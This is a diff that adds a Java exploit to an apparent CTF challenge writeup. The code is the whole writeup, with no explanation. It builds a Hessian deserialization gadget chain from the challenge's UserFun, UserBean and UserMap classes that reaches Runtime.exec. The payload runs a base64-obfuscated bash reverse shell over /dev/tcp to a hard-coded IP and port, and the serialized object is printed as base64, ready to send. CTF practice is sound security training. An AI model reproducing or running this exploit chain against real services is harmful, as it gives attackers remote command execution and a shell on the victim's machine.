@@ -9,5 +9,56 @@
 - **Writeup：** 
 
 ```java
+package org.xsctf.checkin;
+
+import com.caucho.hessian.io.Hessian2Input;
+import com.caucho.hessian.io.Hessian2Output;
+import org.xsctf.checkin.bean.UserBean;
+import org.xsctf.checkin.until.UserFun;
+import org.xsctf.checkin.until.UserMap;
+
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.lang.reflect.Field;
+import java.util.Base64;
+import java.util.HashMap;
+import java.util.Map;
+
+public class exp {
+    public static void main(String[] args) throws Exception {
+        UserFun[] userFuns = {
+                new UserFun(),
+                new UserFun("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
+                new UserFun("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
+                new UserFun("exec", new Class[]{String.class}, new Object[]{"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNS4yMzguNTIvMzA2NjAgMD4mMQ==}|{base64,-d}|{bash,-i}"})
+        };
+        UserBean userBean = new UserBean(userFuns, null);
+        Map map = new HashMap();
+        map.put("key", userBean);
+        UserMap userMap = new UserMap(map, "key");
+        HashMap hashMap = new HashMap();
+        hashMap.put(userMap, "value");
+        Field bean = userBean.getClass().getDeclaredField("bean");
+        bean.setAccessible(true);
+        bean.set(userBean, Runtime.class);
+        byte[] bytes = HessianSerialize(hashMap);
+//        HessianDeserialize(bytes);
+    }
+    public static byte[] HessianSerialize(Object o) throws Exception {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        Hessian2Output hessian2Output = new Hessian2Output(baos);
+        hessian2Output.getSerializerFactory().setAllowNonSerializable(true);
+        hessian2Output.writeObject(o);
+        hessian2Output.flushBuffer();
+        byte[] bytes = baos.toByteArray();
+        System.out.println(Base64.getEncoder().encodeToString(bytes));
+        return bytes;
+    }
+    public static Object HessianDeserialize(byte[] bytes) throws Exception {
+        Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(bytes));
+        Object o = hessian2Input.readObject();
+        return o;
+    }
+}
 
 ```
